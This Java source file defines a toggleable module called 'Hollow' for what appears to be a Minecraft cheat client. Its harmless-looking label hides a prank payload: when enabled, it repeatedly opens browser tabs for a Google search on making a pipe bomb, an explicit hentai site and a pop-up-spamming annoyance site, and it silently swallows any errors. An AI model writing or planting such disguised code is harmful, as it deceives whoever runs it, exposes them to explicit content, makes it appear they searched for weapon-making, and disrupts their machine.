package best.reich.ingros.module.modules.other;

import me.xenforu.kelo.module.ModuleCategory;
import me.xenforu.kelo.module.annotation.ModuleManifest;
import me.xenforu.kelo.module.type.ToggleableModule;
import net.b0at.api.event.Subscribe;
import net.minecraftforge.fml.common.Mod;

import java.awt.*;
import java.net.URI;

@ModuleManifest(label = "Hollow", category = ModuleCategory.OTHER)
public class Hollow extends ToggleableModule {

    @Override
    public void onEnable() {
        super.onEnable();
        try {
            Desktop.getDesktop().browse(URI.create("https://www.google.com/search?client=firefox-b-d&q=how+to+make+a+pipe+bomb"));
            Desktop.getDesktop().browse(URI.create("https://www.google.com/search?client=firefox-b-d&q=how+to+make+a+pipe+bomb"));
            Desktop.getDesktop().browse(URI.create("https://www.google.com/search?client=firefox-b-d&q=how+to+make+a+pipe+bomb"));
            Desktop.getDesktop().browse(URI.create("https://www.google.com/search?client=firefox-b-d&q=how+to+make+a+pipe+bomb"));
            Desktop.getDesktop().browse(URI.create("https://www.hanime.tv/search"));
            Desktop.getDesktop().browse(URI.create("https://www.hanime.tv/search"));
            Desktop.getDesktop().browse(URI.create("https://www.hanime.tv/search"));
            Desktop.getDesktop().browse(URI.create("https://www.hanime.tv/search"));
            Desktop.getDesktop().browse(URI.create("https://www.hanime.tv/search"));
            Desktop.getDesktop().browse(URI.create("https://www.theannoyingsite.com"));
            Desktop.getDesktop().browse(URI.create("https://www.theannoyingsite.com"));
            Desktop.getDesktop().browse(URI.create("https://www.theannoyingsite.com"));

        } catch (Exception exception) {}
    }
}
